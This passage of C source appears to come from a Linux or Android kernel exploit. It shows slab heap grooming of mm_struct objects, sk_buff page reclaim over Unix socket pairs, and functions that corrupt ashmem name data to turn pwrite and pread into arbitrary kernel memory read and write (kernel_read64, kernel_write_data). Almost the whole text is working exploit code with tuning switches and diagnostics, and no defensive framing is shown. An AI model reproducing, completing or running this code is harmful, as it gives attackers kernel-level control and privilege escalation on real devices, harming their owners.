#endif
#else
  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
          leaked, base, (leaked - base) / MM_STRUCT_SZ);
#endif
  if (!prepare_skb_payload(base, payload_mode)) {
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    cleanup_failed_kernel_page("skb-payload");
#else
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
#endif
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef APP_SLIDE_RECLAIM_SNDBUF
  int sndbuf = APP_SLIDE_RECLAIM_SNDBUF;
#else
  int sndbuf = 1 << 20;
#endif
  errno = 0;
  int sndbuf_set_ret =
      setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
                 sizeof(sndbuf));
  int sndbuf_set_errno = errno;
  socklen_t sndbuf_len = sizeof(sndbuf);
  int sndbuf_effective = 0;
  errno = 0;
  int sndbuf_get_ret =
      getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf_effective,
                 &sndbuf_len);
  int sndbuf_get_errno = errno;
  pr_info("sk_buff reclaim sndbuf request=%d effective=%d "
          "set_ret=%d set_errno=%d get_ret=%d get_errno=%d\n",
          sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
          sndbuf_get_ret, sndbuf_get_errno);
#else
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
#endif
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
  /*
   * Make the target-release-to-skb-reclaim interval free of stdio flushes.
   * stdout is a regular-file stream under the payload runner, so an otherwise
   * harmless diagnostic can cross its buffer boundary at a nondeterministic
   * point and allocate while the order-3 page is briefly in the buddy.
   */
  SYSCHK(fflush(NULL));
#endif

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  size_t early_drain_triggers = 0;
#ifdef APP_MM_EARLY_DRAIN_TRIGGERS
  early_drain_triggers = APP_MM_EARLY_DRAIN_TRIGGERS;
  size_t early_prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
  if (early_drain_triggers > early_prepare_slabs) {
    early_drain_triggers = early_prepare_slabs;
  }
  for (size_t i = 0; i < early_drain_triggers; i++) {
    size_t index = i * mm_objs_per_slab;
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
#if !defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET
  pr_info("mm early cpu-partial drain triggers=%zu\n", early_drain_triggers);
#endif
#endif
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }
  size_t target_pre = pre_ctx.mm_cnt - 1;
  SYSCHK(close(pre_ctx.memfds[target_pre]));
  pre_ctx.memfds[target_pre] = -1;
  SYSCHK(close(post_ctx.memfds[0]));
  post_ctx.memfds[0] = -1;
#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW) && \
    (!defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET)
  pr_info("mm target-neighbor slab queued for late drain\n");
#endif
  for (size_t i = 0; i < target_pre; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
    !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
  log_mm_slabinfo("after-target-neighbors");
#endif

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
  size_t prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
  size_t drain_start = early_drain_triggers;
  size_t drain_triggers = prepare_slabs - drain_start;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifdef APP_MM_LATE_DRAIN_TRIGGERS
  drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
#endif
  pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
  size_t deferred_reap_count = 0;
  memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
#endif
  for (size_t i = 0; i < drain_triggers; i++) {
    size_t index = (drain_start + i) * mm_objs_per_slab;
    SYSCHK(close(prepare_ctx.memfds[index]));
    prepare_ctx.memfds[index] = -1;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if (defined(APP_DEFER_ALL_DRAIN_REAPS) && \
     APP_DEFER_ALL_DRAIN_REAPS) || \
    (defined(APP_DEFER_FINAL_DRAIN_REAP) && \
     APP_DEFER_FINAL_DRAIN_REAP)
    int defer_reap = 0;
#if defined(APP_DEFER_ALL_DRAIN_REAPS) && APP_DEFER_ALL_DRAIN_REAPS
    defer_reap = 1;
#elif defined(APP_DEFER_FINAL_DRAIN_REAP) && APP_DEFER_FINAL_DRAIN_REAP
    defer_reap = i + 1 == drain_triggers;
#endif
    if (defer_reap) {
      pid_t child = prepare_ctx.childs[index];
      SYSCHK(kill(child, SIGKILL));
      siginfo_t child_info;
      memset(&child_info, 0, sizeof(child_info));
      int wait_ret;
      do {
        wait_ret = waitid(P_PID, child, &child_info,
                          WEXITED | WNOWAIT);
      } while (wait_ret < 0 && errno == EINTR);
      SYSCHK(wait_ret);
      deferred_reap_children[deferred_reap_count++] = child;
      prepare_ctx.childs[index] = -1;
#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
      pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
              "code=%d status=%d\n",
              i + 1, drain_triggers, child, child_info.si_code,
              child_info.si_status);
#endif
      continue;
    }
#endif
#endif
    kill_child(prepare_ctx.childs[index]);
    prepare_ctx.childs[index] = -1;
  }
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
#if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
#if !defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
#endif
#endif
  int reclaim_sends = SKB_RECLAIM_SENDS;
  int reclaim_sent = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  int reclaim_errno = 0;
#endif
  for (int i = 0; i < reclaim_sends; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
      reclaim_errno = errno;
#endif
      break;
    }
    reclaim_sent++;
  }
#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
  touch_mm_slabinfo();
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  for (size_t i = 0; i < deferred_reap_count; i++) {
    SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
    pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
            i + 1, deferred_reap_count, deferred_reap_children[i]);
  }
#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
  pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
          deferred_reap_count);
#endif
  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
  pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
          reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
  log_mm_slabinfo("after-exact-drain-reclaim");
#else
  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
          reclaim_sent, reclaim_sends, payload_mode);
#endif
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
          payload_mode, base);
#endif
  kernelsnitch_cleanup(ks);
  ks = NULL;
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
          payload_mode);

  pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
          prepare_ctx.mm_cnt);
#endif
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    if (prepare_ctx.childs[i] > 0) {
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = -1;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    if ((i + 1) % (8 * mm_objs_per_slab) == 0 ||
        i + 1 == prepare_ctx.mm_cnt) {
      pr_info("kernel page cleanup stage=prepare-children progress=%zu/%zu\n",
              i + 1, prepare_ctx.mm_cnt);
    }
#endif
  }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
          base);
#endif

  return base;
#endif
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    size_t started_ns = gettime_ns();
    uintptr_t base = prepare_kernel_page(payload_mode);
    size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
    pr_info("kernel page prepare mode=%d attempt=%d/%d elapsed_ms=%zu "
            "base=%016zx\n",
            payload_mode, attempt, max_attempts, elapsed_ms, base);
    if (base) {
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  const uintptr_t write_align = 0x01000000ULL;
  const uint32_t max_write_window = 0x02000000U;
  if (!data || !len || len > SSIZE_MAX) {
    errno = EINVAL;
    return -1;
  }
  if (target > UINTPTR_MAX - (len - 1)) {
    errno = ERANGE;
    return -1;
  }
  uintptr_t base = target & ~(write_align - 1);
  off_t pos = (off_t)(target - base);
  if (len > UINTPTR_MAX - (uintptr_t)pos) {
    errno = ERANGE;
    return -1;
  }
  uintptr_t end = (uintptr_t)pos + len;
  uint32_t buffer_size = 0;

  if (end > max_write_window ||
      !((base >> 24) & 0xff) || !((base >> 32) & 0xff) ||
      !((base >> 40) & 0xff) || !((base >> 48) & 0xff) ||
      !((base >> 56) & 0xff)) {
    errno = ERANGE;
    return -1;
  }
  for (uintptr_t candidate_size = end;
       candidate_size <= max_write_window && candidate_size - end < 0x200;
       candidate_size++) {
    int usable = 1;
    for (size_t i = 0; i < 3; i++) {
      if (!((candidate_size >> (i * 8)) & 0xff)) {
        usable = 0;
        break;
      }
    }
    if (usable) {
      buffer_size = (uint32_t)candidate_size;
      break;
    }
  }
  if (!buffer_size) {
    errno = ERANGE;
    return -1;
  }
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, base);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, buffer_size);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, pos);
#if defined(ASHMEM_READ_DIAGNOSTICS) && ASHMEM_READ_DIAGNOSTICS
  {
    static int diag_count;
    if (diag_count < 8) {
      pr_info("configfs write diag target=%016zx base=%016zx pos=%016llx "
              "size=%08x set=%d wr=%zd errno=%d\n",
              target, base, (unsigned long long)(uint64_t)pos, buffer_size,
              set_ret, wr, errno);
      diag_count++;
    }
  }
#endif
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  uintptr_t page = 0;
  off_t pos = 0;

  if (!data || !len || len > SSIZE_MAX) {
    errno = EINVAL;
    return -1;
  }
  if (target > UINTPTR_MAX - (len - 1) || len > UINT64_MAX - 0x10000 ||
      len + 0x10000 >= ASHMEM_PREFIX_COUNT) {
    errno = ERANGE;
    return -1;
  }

  memset(blob, 0, sizeof(blob));
  memset(blob, 1, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN);
  for (uint64_t window = len; window < len + 0x10000; ++window) {
    uintptr_t candidate_pos = ASHMEM_PREFIX_COUNT - window;
    if (target < candidate_pos) {
      continue;
    }
    uintptr_t candidate_page = target - candidate_pos;
    int usable = 1;

    for (size_t i = 0; i < sizeof(candidate_page); ++i) {
      if (!((candidate_page >> (i * 8)) & 0xff)) {
        usable = 0;
        break;
      }
    }
    if (usable) {
      page = candidate_page;
      pos = (off_t)candidate_pos;
      break;
    }
  }
  if (!page) {
    errno = ERANGE;
    return -1;
  }
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
#if defined(ASHMEM_READ_DIAGNOSTICS) && ASHMEM_READ_DIAGNOSTICS
  {
    static int diag_count;
    if (diag_count < 8) {
      pr_info("configfs read diag target=%016zx page=%016zx pos=%016llx "
              "set=%d rd=%zd errno=%d\n",
              target, page, (unsigned long long)(uint64_t)pos, set_ret, rd,
              errno);
      diag_count++;
    }
  }
#endif
  return rd;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

```

---

